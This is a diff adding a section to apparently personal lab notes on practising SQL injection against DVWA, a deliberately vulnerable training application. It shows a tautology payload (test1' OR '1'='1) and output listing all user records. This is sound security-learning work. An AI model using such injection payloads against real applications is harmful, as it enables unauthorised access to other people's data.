@@ -40,3 +40,25 @@ Practice and understand SQL Injection vulnerabilities using the Damn Vulnerable 
 The application is vulnerable — it returns database records directly.
 
 ---
+### Test 2: Bypass Authentication Logic
+
+- Entered the following input:
+
+  ```sql
+  test1' OR '1'='1
+  ```
+
+- Output showed **multiple user records**:
+
+  ```
+  ID: test1' or '1'='1
+  First name: admin
+  Surname: admin
+
+  ID: test1' or '1'='1
+  First name: Gordon
+  Surname: Brown
+
+  ```
+
+SQL logic was bypassed — `OR '1'='1'` returned **all rows**.
